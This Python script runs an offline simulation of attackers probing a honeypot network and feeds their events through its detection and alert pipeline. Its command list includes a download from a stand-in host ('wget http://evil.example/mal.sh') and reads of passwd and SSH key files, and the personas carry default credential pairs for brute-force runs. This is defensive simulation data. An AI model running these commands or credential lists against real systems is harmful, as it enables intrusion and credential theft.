#!/usr/bin/env python3
"""Offline demonstration model of the Multi-Protocol Honeypot Network.

This is a *model*, not the real system: it runs entirely in memory, opens
no sockets and touches no network.  Simulated attackers (botnets, scanners,
spambots, a stealthy operator) probe a virtual node graph of the six
honeypots; every action is pushed through the *same* database / intel /
alert pipeline the live system uses, so the demo faithfully reproduces how
the real network detects, scores and alerts on attacks.

Output:
  * a colour-coded console timeline in simulated time,
  * a self-contained HTML threat-intelligence report (inline SVG, offline).

    python demo/demo_model.py --steps 200 --seed 42 --speed 0.05
"""

from __future__ import annotations

import argparse
import os
import random
import sys
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from honey import eventlog  # noqa: E402
from honey.alerts import AlertEngine  # noqa: E402
from honey.config import get_config, load_config  # noqa: E402
from honey.database import Database  # noqa: E402
from honey.eventlog import colorize  # noqa: E402
from honey.intel import IntelEngine  # noqa: E402
from honey.reporting import generate_report  # noqa: E402

BASE_TIME = datetime(2026, 8, 12, 9, 0, 0, tzinfo=timezone.utc)

DEFAULT_CMDS = [
    "cat /etc/passwd", "uname -a", "id", "ls -la /tmp",
    "wget http://evil.example/mal.sh", "cat /root/.ssh/authorized_keys",
    "ps aux", "whoami", "iptables -L", "history",
]


class Attacker:
    def __init__(self, ip, name, protocols, creds, weight, advanced=False):
        self.ip = ip
        self.name = name
        self.protocols = protocols
        self.creds = creds
        self.weight = weight
        self.advanced = advanced


PERSONAS = [
    Attacker("185.220.101.34", "Botnet node", ["ssh"],
             [("root", "toor"), ("root", "123456"), ("admin", "admin"),
              ("root", "password"), ("admin", "123456"), ("root", "root123")],
             weight=4, advanced=True),
    Attacker("45.155.205.233", "Web scanner", ["http"],
             [], weight=3, advanced=True),
    Attacker("185.22.153.110", "Credential stuffer", ["ftp"],
             [("admin", "admin"), ("admin", "123456"), ("ftp", "ftp"),
              ("anonymous", "guest"), ("admin", "password")],
             weight=3),
    Attacker("91.240.118.22", "Telnet worm", ["telnet"],
             [("root", "root"), ("root", "12345"), ("admin", "admin"),
              ("admin", "123456"), ("root", "toor")],
             weight=2),
    Attacker("103.214.13.10", "Database thief", ["mysql"],
             [("root", "root"), ("root", "mysql"), ("admin", "admin"),
              ("root", "123456")],
             weight=2),
    Attacker("196.240.52.20", "Spambot", ["smtp"],
             [("sales", "SpamBot99!")], weight=2),
    Attacker("89.34.97.50", "Stealth operator", ["ssh", "http", "ftp"],
             [("admin", "admin"), ("root", "toor")], weight=1, advanced=True),
]

WEB_PATHS = ["/wp-login.php", "/wp-admin/", "/admin/", "/.env", "/.git/config",
             "/phpmyadmin/", "/api/v1/users", "/backup.zip", "/cgi-bin/test.cgi",
             "/sql/", "/config.php.bak", "/login"]


class DemoModel:
    def __init__(self, config: dict, seed: int, steps: int, speed: float,
                 report: str | None):
        self.config = config
        self.rng = random.Random(seed)
        self.steps = steps
        self.speed = speed
        self.report = report
        self.elapsed = 0.0
        self._risk_tiers: dict[str, int] = {}
        self._stats: dict[str, int] = {}

    # ------------------------------------------------------------------
    def _now(self) -> str:
        ts = BASE_TIME + timedelta(seconds=self.elapsed)
        return ts.isoformat(timespec="milliseconds").replace("+00:00", "Z")

    def _clock(self) -> str:
        m, s = divmod(int(self.elapsed), 60)
        return f"+{m:02d}:{s:02d}"

    def _emit(self, event: dict) -> None:
        event.setdefault("ts", self._now())
        self._stats[event["kind"]] = self._stats.get(event["kind"], 0) + 1
        eventlog.emit(event)

    def _bump(self, seconds: float) -> None:
        self.elapsed += seconds

    # ------------------------------------------------------------------
    def _print_action(self, attacker, text: str, color: str = "white") -> None:
        ip = f"{attacker.ip:>15}"
        name = f"{attacker.name:>18}"
        print(f"{colorize(self._clock(), 'dim')} {colorize(ip, 'magenta')} "
              f"{colorize(name, 'cyan')}  {colorize(text, color)}", flush=True)

    # ------------------------------------------------------------------
    def _intel_listener(self, event: dict) -> None:
        if event.get("kind") != "intel":
            return
        score = event.get("risk", 0)
        tier = 0 if score < 25 else (1 if score < 50 else (2 if score < 80 else 3))
        prev = self._risk_tiers.get(event["src_ip"], -1)
        self._risk_tiers[event["src_ip"]] = max(prev, tier)
        if tier > prev:
            ip = f"{event['src_ip']:>15}"
            print(f"{colorize(self._clock(), 'dim')} {colorize('INTEL', 'blue')} "
                  f"{colorize(ip, 'magenta')} risk {colorize(str(score), 'yellow')} "
                  f"-> {colorize(event['classification'], 'cyan')}", flush=True)

    def _alert_listener(self, event: dict) -> None:
        if event.get("kind") != "alert":
            return
        sev = event["severity"].upper()
        sev_colors = {"LOW": "green", "MEDIUM": "yellow", "HIGH": "magenta",
                      "CRITICAL": "red"}
        print(f"{colorize(self._clock(), 'dim')} {colorize('ALERT', 'red')} "
              f"{colorize(f'[{sev:8s}]', sev_colors.get(sev, 'white'))} {colorize(event['title'], 'red')} "
              f"{colorize(event.get('src_ip', ''), 'dim')}", flush=True)

    # ------------------------------------------------------------------
    def _sim_ssh(self, a: Attacker) -> None:
        user, pwd = self.rng.choice(a.creds)
        self._print_action(a, f"SSH brute-force  {user} / {pwd}", "yellow")
        self._emit({"kind": "connection", "protocol": "ssh", "src_ip": a.ip,
                    "src_port": self.rng.randint(20000, 60000), "dst_port": 22})
        self._emit({"kind": "credential", "protocol": "ssh", "src_ip": a.ip,
                    "username": user, "password": pwd, "outcome": "failed"})
        if a.advanced and self.rng.random() < 0.35:
            self._bump(self.rng.uniform(1, 4))
            cmd = self.rng.choice(DEFAULT_CMDS)
            self._print_action(a, f"exec: {cmd}", "cyan")
            self._emit({"kind": "command", "protocol": "ssh", "src_ip": a.ip,
                        "command": cmd, "response": "..."})

    def _sim_http(self, a: Attacker) -> None:
        path = self.rng.choice(WEB_PATHS)
        self._print_action(a, f"probe {path}", "white")
        self._emit({"kind": "connection", "protocol": "http", "src_ip": a.ip,
                    "src_port": self.rng.randint(20000, 60000), "dst_port": 80,
                    "details": {"method": "GET", "path": path,
                                "user_agent": "sqlmap/1.7.2#stable"}})
        if self.rng.random() < 0.4:
            self._bump(self.rng.uniform(0.5, 2))
            body = "log=admin&pwd=admin"
            self._print_action(a, "POST /wp-login.php  (admin/admin)", "yellow")
            self._emit({"kind": "connection", "protocol": "http", "src_ip": a.ip,
                        "src_port": self.rng.randint(20000, 60000), "dst_port": 80,
                        "details": {"method": "POST", "path": "/wp-login.php", "body": body}})
            self._emit({"kind": "credential", "protocol": "http", "src_ip": a.ip,
                        "username": "admin", "password": "admin", "outcome": "attempted"})

    def _sim_ftp(self, a: Attacker) -> None:
        user, pwd = self.rng.choice(a.creds)
        self._print_action(a, f"FTP login  {user} / {pwd}", "yellow")
        self._emit({"kind": "connection", "protocol": "ftp", "src_ip": a.ip,
                    "src_port": self.rng.randint(20000, 60000), "dst_port": 21})
        self._emit({"kind": "credential", "protocol": "ftp", "src_ip": a.ip,
                    "username": user, "password": pwd, "outcome": "failed"})

    def _sim_telnet(self, a: Attacker) -> None:
        user, pwd = self.rng.choice(a.creds)
        self._print_action(a, f"telnet login  {user} / {pwd}", "yellow")
        self._emit({"kind": "connection", "protocol": "telnet", "src_ip": a.ip,
                    "src_port": self.rng.randint(20000, 60000), "dst_port": 23})
        self._emit({"kind": "credential", "protocol": "telnet", "src_ip": a.ip,
                    "username": user, "password": pwd, "outcome": "failed"})

    def _sim_mysql(self, a: Attacker) -> None:
        user, pwd = self.rng.choice(a.creds)
        self._print_action(a, f"MySQL auth  {user} / {pwd}", "yellow")
        self._emit({"kind": "connection", "protocol": "mysql", "src_ip": a.ip,
                    "src_port": self.rng.randint(20000, 60000), "dst_port": 3306})
        self._emit({"kind": "credential", "protocol": "mysql", "src_ip": a.ip,
                    "username": user, "password": pwd, "outcome": "failed"})

    def _sim_smtp(self, a: Attacker) -> None:
        n_rcpt = self.rng.randint(2, 6)
        self._print_action(a, f"SMTP open-relay ({n_rcpt} recipients)", "white")
        self._emit({"kind": "connection", "protocol": "smtp", "src_ip": a.ip,
                    "src_port": self.rng.randint(20000, 60000), "dst_port": 25})
        for i in range(n_rcpt):
            self._emit({"kind": "command", "protocol": "smtp", "src_ip": a.ip,
                        "command": f"RCPT TO:<victim{i}@corp.local>"})
        self._emit({"kind": "command", "protocol": "smtp", "src_ip": a.ip,
                    "command": "DATA <spam message>"})
        if self.rng.random() < 0.5:
            user, pwd = a.creds[0]
            self._emit({"kind": "credential", "protocol": "smtp", "src_ip": a.ip,
                        "username": user, "password": pwd, "outcome": "success"})

    # ------------------------------------------------------------------
    def run(self) -> None:
        load_config()  # ensure defaults/thresholds are available
        eventlog.set_echo(False)
        db = Database(":memory:")
        IntelEngine(self.config)
        AlertEngine(self.config)
        eventlog.subscribe(self._intel_listener)
        eventlog.subscribe(self._alert_listener)

        print(colorize("=" * 78, "dim"))
        print(colorize("  DEMONSTRATION MODEL — Multi-Protocol Honeypot Network", "bold"))
        print(colorize("  Offline simulation · no sockets · real detection pipeline", "dim"))
        print(colorize("=" * 78, "dim"))
        print()

        for step in range(self.steps):
            attacker = self.rng.choices(PERSONAS, weights=[a.weight for a in PERSONAS])[0]
            proto = self.rng.choice(attacker.protocols)
            {
                "ssh": self._sim_ssh,
                "http": self._sim_http,
                "ftp": self._sim_ftp,
                "telnet": self._sim_telnet,
                "mysql": self._sim_mysql,
                "smtp": self._sim_smtp,
            }[proto](attacker)
            self._bump(self.rng.uniform(2, 9))
            if self.speed > 0:
                time.sleep(self.speed)

        print()
        print(colorize("=" * 78, "dim"))
        counts = db.counts()
        print(colorize(f"  Simulation complete: {counts.get('connections', 0)} connections, "
                       f"{counts.get('credentials', 0)} credentials, "
                       f"{counts.get('commands', 0)} commands, "
                       f"{counts.get('alerts', 0)} alerts, "
                       f"{counts.get('sources', 0)} attacker sources", "green"))
        print(colorize("=" * 78, "dim"))
        print()

        # Threat-intelligence summary
        print(colorize("  THREAT INTELLIGENCE SUMMARY", "bold", bold=True))
        for row in db.intel_table():
            color = "green" if row["score"] < 25 else ("yellow" if row["score"] < 50
                                                       else ("magenta" if row["score"] < 80 else "red"))
            ip = f"{row['src_ip']:>15}"
            print(f"  {colorize(ip, 'magenta')}  "
                  f"risk={colorize(f'{row['score']:>3}', color)}  "
                  f"{colorize(row['classification'] or 'unknown', 'cyan'):<20}  "
                  f"attempts={row['attempts']:<3} protocols={row['protocols_hit'] or ''}")

        # Report
        if self.report:
            out = generate_report(db, output_path=self.report,
                                  title="Honeypot Network — Demonstration Model",
                                  subtitle="Offline simulated attack campaign")
            print()
            print(colorize(f"  Report written: {out}", "green"))
            if os.name == "nt":
                try:
                    os.startfile(str(out))
                    print(colorize("  Opened in your browser.", "dim"))
                except OSError:
                    pass
        return db

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        eventlog.set_echo(True)


def parse_args(argv=None):
    p = argparse.ArgumentParser(description="Offline honeypot demonstration model")
    p.add_argument("--steps", type=int, default=200, help="number of simulated actions")
    p.add_argument("--seed", type=int, default=42, help="random seed for reproducibility")
    p.add_argument("--speed", type=float, default=0.05,
                   help="seconds to pause per action (0 = run at full speed)")
    p.add_argument("--report", default=None,
                   help="output HTML report path (default: data/reports/demo_report.html)")
    p.add_argument("--no-report", action="store_true", help="do not generate the report")
    return p.parse_args(argv)


def main(argv=None) -> int:
    args = parse_args(argv)
    config = load_config()
    eventlog.clear_subscribers()
    if args.no_report:
        report = None
    else:
        report = args.report or str(Path(config["data_dir"]) / "reports" / "demo_report.html")
    model = DemoModel(config, args.seed, args.steps, args.speed, report)
    with model:
        model.run()
    return 0


if __name__ == "__main__":
    sys.exit(main())
